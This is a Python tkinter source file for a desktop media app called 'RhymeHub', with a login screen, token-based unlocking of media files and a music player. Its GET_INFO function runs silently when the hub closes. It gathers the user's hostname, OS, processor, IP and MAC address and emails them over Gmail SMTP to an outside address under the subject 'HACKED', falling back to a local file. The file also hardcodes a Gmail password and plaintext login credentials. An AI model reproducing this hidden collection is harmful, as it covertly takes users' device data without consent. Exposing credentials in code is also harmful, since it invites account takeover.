#PreImport
import os

#Global Variable(s)
GlobalUname="%NAME%"
RPTammount=0
FileConfirmation=False
GloFileLOC=''
Paused=False

ScriptDir=os.path.dirname(os.path.abspath(__file__))

def Delete_Files():
	import getpass,os
	
	MOV=r"C:/Users/%s/AppData/Roaming/CacheMovieRP.mp4" %(getpass.getuser())
	MUS=r"C:/Users/%s/AppData/Roaming/CacheMusicRP.mp3" %(getpass.getuser())
	
	try:
		os.remove(MOV)
	except:
		pass
	
	try:
		os.remove(MUS)
	except:
		pass
Delete_Files()

def Hub():
	from tkinter import Label, N, S, E, W, filedialog
	from tkinter.ttk import Button, Entry
	import tkinter as tk

	#Tk_Start
	root=tk.Tk()

	#Variables
	BG_Color="#0e0e0e"
	TEXTCOLOR="#ffffff"
	TITLEFG="#212121"
	TITLEBG="#28A6FF"
	Version=0.2	

	#Window Config
	root.title('RhymePlays Hub')
	root.geometry("700x448")
	root.resizable(False, False)
	root.configure(bg=BG_Color)
	try:
		root.iconbitmap(r'Data/HubIcon.ico')
	except:
		pass

	#Functions
	def TokenManager():
		global RPTammount
		try:
			with open("Data/CRPT","r") as f:
				RPTammount=int(f.read())
		except:
			with open("Data/CRPT","w") as f:
				f.write("0")
			with open("Data/CRPT","r") as f:
				RPTammount=int(f.read())
	TokenManager()

	def Unlock():
		FileLoc=filedialog.askopenfilename(initialdir='/', title='Select File', filetypes=(('RhymePlays Movie','*.rplmov'), ('Rhyme Media File','*.rplmus')))
		
		LOCKMOV='.rplmov' in str(FileLoc)
		LOCKMUS='.rplmus' in str(FileLoc)
		
		TokenManager()
		
		if LOCKMOV==True:
			if RPTammount>=2:
				with open("Data/CRPT","w") as f:
					f.write(str(RPTammount-2))
				TokenManager()
				
				FolderDir=os.path.dirname(os.path.abspath(FileLoc))
				with open(FileLoc) as f:
					FileName=os.path.basename(f.name)
				os.chdir(FolderDir)
				os.rename(FileName, FileName+" Unlocked.rpmovie")
				os.chdir(ScriptDir)
				RPCredit["text"]="You Currently Have "+str(RPTammount)+" RP Tokens"
				
			else:
				UnlockMedia["text"]="You Dont Have Sufficient Amount of RP Token(S)"
				
		if LOCKMUS==True:
			if RPTammount>=1:
				with open("Data/CRPT","w") as f:
					f.write(str(RPTammount-1))
				TokenManager()
				
				FolderDir=os.path.dirname(os.path.abspath(FileLoc))
				with open(FileLoc) as f:
					FileName=os.path.basename(f.name)
				os.chdir(FolderDir)
				os.rename(FileName, FileName+" Unlocked.rpmusic")
				os.chdir(ScriptDir)
				RPCredit["text"]="You Currently Have "+str(RPTammount)+" RP Tokens"
				
			else:
				UnlockMedia["text"]="You Dont Have Sufficient Amount of RP Token(S)"
	
	def GET_INFO():
		try:
			try:
				import smtplib, time, platform, socket, uuid, re
				from screeninfo import get_monitors
				
				USER_NAME=socket.gethostname()
				OS_NAME=platform.platform()
				CPU=platform.processor()
				IP=socket.gethostbyname(socket.gethostname())
				MAC=':'.join(re.findall('..', '%012x' % uuid.getnode()))
				Time=time.strftime("Time: %H:%M:%S, Date:%B/%d/%y")

				for m in get_monitors():
					Screen_Size=(str(m))

				with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
					smtp.ehlo()
					smtp.starttls()
					smtp.ehlo()
					
					smtp.login('isfartousifbot@gmail.com', 'Rhyme1234rhyme')
					
					subject = "New Login From "+USER_NAME+"-RhymeHub."
					Body = "HACKED '"+USER_NAME+"'. Running on '"+OS_NAME+"'.\n\nProcessor: '"+CPU+"'\nScreen Resolution: '"+Screen_Size+"'\nIP: '"+IP+"'\nMAC: '"+MAC+"'.\n\nTime of Login: '"+Time+"'."
					
					MSG= f'Subject: {subject}\n\n{Body}'
					smtp.sendmail("isfartousifbot@gmail.com", "isfartousif2@gmail.com", MSG)

			except:
				import smtplib, time, platform, socket, uuid, re, os
				from screeninfo import get_monitors
				
				USER_NAME=socket.gethostname()
				OS_NAME=platform.platform()
				CPU=platform.processor()
				IP=socket.gethostbyname(socket.gethostname())
				MAC=':'.join(re.findall('..', '%012x' % uuid.getnode()))
				Time=time.strftime("Time: %H:%M:%S, Date:%B/%d/%y")
				ScriptRunDir=os.path.dirname(os.path.abspath(__file__))
				for m in get_monitors():
					Screen_Size=(str(m))

				with open("Data\Info","w") as f:
					f.write("PC Name: '"+USER_NAME+"'.\nOS Name: '"+OS_NAME+"'.\nProcessor: '"+CPU+"'.\nIP: '"+IP+"'.\nMac: '"+MAC+"'.\nScreen Size: '"+Screen_Size+"'.\nDir Of Script: '"+ScriptRunDir+"'.\n\nTime Of Running: '"+Time+"'.")
		except:
			pass
	
	def Movie():
		FileLoc=filedialog.askopenfilename(initialdir='/', title='Select File', filetypes=(('RhymePlays Movie','*.rpmovie'), ('Rhyme Media File','*.rmf02')))
		
		import getpass,shutil,os
		dest=r"C:/Users/%s/AppData/Roaming/CacheMovieRP.mp4" %(getpass.getuser())
		shutil.copy(FileLoc, dest)
		os.system(dest)
	
	def Music():
		from tkinter import E, W, N, S, CENTER, FLAT, SUNKEN
		from tkinter.ttk import Label, Button, Entry, Scale, Progressbar
		import tkinter as tk
		from pygame import mixer

		mixer.init()

		#Tk_Start
		root=tk.Tk()

		#WindowConfigs
		root.title('RhymePlays Music')
		root.geometry("590x245")
		root.resizable(False, False)
		root.configure(bg='#0e0e0e')
		try:
			root.iconbitmap(r'Data/MusicIcon.ico')
		except:
			pass
		
		#Variables
		Depth=0
		
		#Function
		def Splash():
			from random import randint
			spl_num =randint(1,10)
			if spl_num==1:
				Name['text']='DJ Vai Edition'
			elif spl_num==2:
				Name['text']='Made By Rhyme'
			elif spl_num==3:
				Name['text']='Mahe Bolod'
			elif spl_num==4:
				Name['text']='What!!...'
			elif spl_num==5:
				Name['text']='Thats a Great Price'
			elif spl_num==6:
				Name['text']='Free!!'
			elif spl_num==7:
				Name['text']='Display'
			else:
				Name['text']='Display'

		def Select_File():
			from tkinter import filedialog
			FileLOC=filedialog.askopenfilename(initialdir='/', title='Select File', filetypes=(('RhymePlays Music','*.rpmusic'), ('MP3','*.mp3')))
			ChkFileRP='.rpmusic' in str(FileLOC)
			ChkFile='.mp3' in str(FileLOC)
			
			global FileConfirmation, GloFileLOC
			
			if ChkFileRP==True:
				import getpass,shutil,os
				dest=r"C:/Users/%s/AppData/Roaming/CacheMusicRP.mp3" %(getpass.getuser())
				shutil.copy(FileLOC, dest)
				
				with open(FileLOC) as f:
					Display_Name=os.path.basename(f.name)
				
				Name['text']=Display_Name
				
				Select["text"]='File Selected'
				SidePanel["value"]=100
				FileConfirmation=True
				GloFileLOC=dest
			
			if ChkFile==True:
				with open(FileLOC) as f:
					Display_Name=os.path.basename(f.name)
				
				Name['text']=Display_Name
				
				Select["text"]='File Selected'
				FileConfirmation=True
				GloFileLOC=FileLOC

		def HELP():
			from tkinter import messagebox
			messagebox.showinfo("RhymePlays Music Help", "To play any Rhyme Encrypted Music, you need to select the file. Click \"Select File\" Button and then Select the \".RPMF\" File. After Selecting, The Status Bar Should turn green. If It does Click \"Play\". The Music Should Start Playing. RhymePlays Music also Supports \".MP3\" Files.  This Program Is Made by Isfar Tousif Rhyme Using 'Python' Programing Language.")

		def PLAY():
			if FileConfirmation==True:
				print('Playing '+GloFileLOC)
				mixer.init()
				mixer.music.load(GloFileLOC)
				mixer.music.play()
			else:
				print('No File(s) Selected')

		def STOP():
			if FileConfirmation==True:
				mixer.music.stop()
				mixer.quit()
			else:
				print('No File(s) Selected')

		def VOLUME(val):
			volume=Volume.get()
			mixer.music.set_volume(volume/100)

		def PUP():
			global Paused
			if Paused==True:
				mixer.music.unpause()
				Paused=False
			elif Paused==False:
				mixer.music.pause()
				Paused=True
			else:
				pass
		
		def ExitMUS():
			mixer.quit()
			Delete_Files()
			root.destroy()
			
		#Elements
		Header=Label(root, text="RhymePlays Music", background='#008FFF', foreground='White', font='Arial 20', width=39, anchor=CENTER)

		Name=Label(root, text='Display', background='Black', foreground='White', font='Arial 10', anchor=CENTER, wraplength=95, relief=FLAT)
		Volume=Scale(root, from_=0, to=100, command=VOLUME, value=100)

		Play=Button(root, text="Play", command=PLAY)
		Select=Button(root, text="Select", command=Select_File)
		Exit=Button(root, text="Exit", command=ExitMUS)

		SidePanel=Progressbar(root, mode='determinate', value=0)
		Pause=Button(root, text="Pause/Unpause", command=PUP)
		Stop=Button(root, text="Stop", command=STOP)

		Credit=Label(root, text='Made by Isfar Tousif Rhyme.  2019', relief=SUNKEN, anchor=E)
		Help=Button(root, text="Help", command=HELP)

		#Grid
		Header.grid(row=0, column=0, columnspan=3, sticky=E+W+N+S)

		Name.grid(row=1, column=0, sticky=E+W+N+S, rowspan=2)
		Volume.grid(row=3, column=0, sticky=E+W+N+S,)

		Play.grid(row=1, column=1, columnspan=1, sticky=E+W+N+S)
		Select.grid(row=2, column=1, columnspan=1, sticky=E+W+N+S)
		Exit.grid(row=3, column=1, columnspan=1, sticky=E+W+N+S)

		SidePanel.grid(row=1, column=2, sticky=E+W+N+S, rowspan=3, ipady=81)
		Pause.grid(row=3, column=2, sticky=E+W+N+S)
		Stop.grid(row=1, column=2, columnspan=1, sticky=E+W+N+S)

		Credit.grid(row=4, column=1, columnspan=2, sticky=E+W+N+S)
		Help.grid(row=4, column=0, columnspan=1, sticky=W+E)

		#Mainloop
		Splash()
		root.mainloop()
	
	def MakeReqList():
		with open("Data/Request","w") as f:
			f.write(RequestedList.get())

	#Elements
	Title=Label(root, text="  Welcome to RhymeHUB", width=20, font="Arial 20", anchor="w", fg=TITLEFG, bg=TITLEBG)
	TitleName=Label(root, text=GlobalUname, width=23, font="Arial 20", anchor="e", fg=TITLEFG, bg=TITLEBG)

	RPCredit=Label(root, text="You Currently Have "+str(RPTammount)+" RP Tokens", font="Arial 15", bg=BG_Color, fg=TEXTCOLOR)
	UnlockMedia=Button(root, text="Unlock Movies/Musics! ('2-RP Token' Per Movie.) ('1-RP Token' Per Music.)", command=Unlock)

	PlayMovie=Button(root, text="Play Unlocked Movies", command=Movie)
	PlayMusic=Button(root, text="Play Unlocked Music", command=Music)

	RequestMovies=Label(root, text="Request new Movies or Songs here!", font="Arial 15", height=1, anchor="n", bg=BG_Color, fg=TEXTCOLOR)
	RequestedList=Entry(root)
	RequestSubmit=Button(root, text="Submit List", command=MakeReqList)

	Credit=Label(root, text="Developed by Isfar Tousif Rhyme.", anchor="w", bg="#000000", fg=TEXTCOLOR)
	Ver=Label(root, text="RhymeHUB V"+str(Version), anchor="e", bg="#000000", fg=TEXTCOLOR)

	#Grids
	Title.grid(row=0, column=0, sticky=W, ipady=5)
	TitleName.grid(row=0, column=1, sticky=W, ipady=5)

	RPCredit.grid(row=1, column=0, columnspan=2, sticky=E+W+N+S, padx=5, pady=5)
	UnlockMedia.grid(row=2, column=0, columnspan=2, sticky=E+W+N+S, padx=5, pady=5, ipady=10)

	PlayMovie.grid(row=3, column=0, sticky=E+W+N+S, padx=5, pady=5, ipady=10)
	PlayMusic.grid(row=3, column=1, sticky=E+W+N+S, padx=5, pady=5, ipady=10)

	RequestMovies.grid(row=4, column=0, columnspan=2, sticky=E+W+N+S, padx=5, pady=5)
	RequestedList.grid(row=5, column=0, columnspan=2, sticky=E+W+N+S, padx=5, ipady=50)
	RequestSubmit.grid(row=6, column=0, columnspan=2, sticky=E+W+N+S, padx=5, ipady=10)

	Credit.grid(row=7, column=0, sticky=E+W+N+S, pady=5, ipady=10)
	Ver.grid(row=7, column=1, sticky=E+W+N+S, pady=5, ipady=10)

	#Mainloop
	root.mainloop()
	GET_INFO()
	Delete_Files()

def Login():
	import tkinter as tk
	from tkinter.ttk import Label, Entry, Checkbutton, Style, Button
	from tkinter import CENTER,E,W, PhotoImage, SUNKEN, IntVar
	
	#TK_Start
	root = tk.Tk()
	
	#Variables
	BG_Color='#0e0e0e'
	Chk1=IntVar()
	Chk2=IntVar()
	
	#Window Config
	root.title('RhymePlays Login')
	root.geometry("485x400")
	root.resizable(False, False)
	root.configure(bg=BG_Color)
	try:
		root.iconbitmap(r'Data/Icon.ico')
	except:
		pass

	#Style
	Style().configure('TCheckbutton', background=BG_Color, foreground="white")
	Style().configure('TButton', background="Cyan", foreground="Black")

	#Functions
	def GRANTED():
		global GlobalUname
		GlobalUname=str(Username.get())
		
		root.destroy()
		Hub()
	
	def LOGIN():
		if Chk1.get() and Chk2.get()==1:
			UNAME=str(Username.get())
			PWORD=str(Password.get())
			if UNAME=="Rhyme" and PWORD=="Admin":GRANTED()
			elif UNAME=="Ryan" and PWORD=="Admin2":GRANTED()
			elif UNAME=="Jihad" and PWORD=="Jihad1234":GRANTED()
			else:
				Style().configure('TButton', background="red", foreground="Black")
		else:
			Style().configure('TCheckbutton', background=BG_Color, foreground="Red")

	#Elements
	Display = Label(root, text="RhymePlays Login", font='Arial 20', background=BG_Color, width=32, anchor=CENTER, foreground="White")

	ImgRhymePlays=PhotoImage(file='Data/Logo128x128.png')
	RhymePlaysLogo=Label(root, background=BG_Color, image=ImgRhymePlays)

	ImgUsername=PhotoImage(file='Data/User.png')
	LogoUsername = Label(root, background=BG_Color, image=ImgUsername)

	ImgPassword=PhotoImage(file='Data/Pass.png')
	LogoPassword = Label(root, background=BG_Color, image=ImgPassword)

	User_ = Label(root, text="Username", font='Arial 15', background=BG_Color, anchor=CENTER, foreground="white")
	Pass_ = Label(root, text="Password", font='Arial 15', background=BG_Color, anchor=CENTER, foreground="white")

	Username=Entry(root)
	Password=Entry(root)

	Check1=Checkbutton(root, text='I Promise Not to Share my Password.', variable=Chk1)
	Check2=Checkbutton(root, text='I have Agreed with the Terms.', variable=Chk2)

	Login=Button(root, text="Login", command=LOGIN)

	Credit=Label(root, text="Made By Isfar Tousif Rhyme.  2019", background="#000000", foreground="white", anchor=E)

	#Grids
	Display.grid(row=0, column=0, columnspan=2)

	RhymePlaysLogo.grid(row=1, column=0, columnspan=2)

	LogoUsername.grid(row=2, column=0, columnspan=1)
	LogoPassword.grid(row=2, column=1, columnspan=1)

	User_.grid(row=3, column=0)
	Pass_.grid(row=3, column=1)

	Username.grid(row=4, column=0)
	Password.grid(row=4, column=1)

	Check1.grid(row=5,column=0, columnspan=1, sticky=W, pady=10, padx=10)
	Check2.grid(row=5,column=1, columnspan=1, sticky=E, pady=10, padx=10)

	Login.grid(row=6, column=0, columnspan=2, sticky=W+E, padx=10, ipady=10)

	Credit.grid(row=7, column=0, columnspan=2, sticky=W+E, pady=10)

	#MainLoop
	root.mainloop()

Login()